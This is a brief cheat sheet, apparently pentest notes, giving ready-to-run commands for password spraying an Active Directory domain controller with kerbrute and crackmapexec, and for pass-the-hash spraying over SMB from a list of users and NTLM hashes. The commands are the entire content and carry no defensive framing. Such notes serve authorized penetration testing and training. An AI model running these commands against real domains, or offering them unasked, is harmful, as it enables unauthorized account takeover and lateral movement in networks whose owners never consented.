PASSWORD
---
```
./kerbrute passwordspray --dc <DC ip> -d <domain name> ~/path/to/users.txt '<YOUR PASSWORD>'
```
#OR

```
crackmapexec smb <DC ip> -u ~/path/to/users.txt -p "<YOUR PASSWORD>"
```

HASH
---

```
crackmapexec smb <DC ip> -u ~/path/to/users.txt -H ~/path/to/hashes.txt --continue-on-success
```
```--continue-on-success```this option allows it to continue testing all remaining users and hashes even if a success is found.
